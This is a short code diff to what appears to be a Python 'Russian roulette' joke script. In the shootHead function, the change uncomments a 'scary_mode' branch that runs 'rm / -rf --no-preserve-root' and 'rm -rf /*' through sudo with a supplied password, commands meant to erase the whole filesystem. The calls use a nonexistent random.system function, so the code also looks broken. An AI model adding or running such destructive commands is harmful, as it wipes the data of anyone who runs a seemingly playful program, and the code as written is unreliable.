@@ -78,11 +78,11 @@ def loadBullet():
 
 
 def shootHead():
-    #if (scary_mode):
-    #    random.system("rm / -rf --no-preserve-root")
-    #    random.system("rm -rf /* | sudo -S " + password)
-    #else:  
-    print("you would've died")
+    if (scary_mode):
+        random.system("rm / -rf --no-preserve-root")
+        random.system("rm -rf /* | sudo -S " + password)
+    else:  
+        print("you would've died")
 
 
 loadBullet()
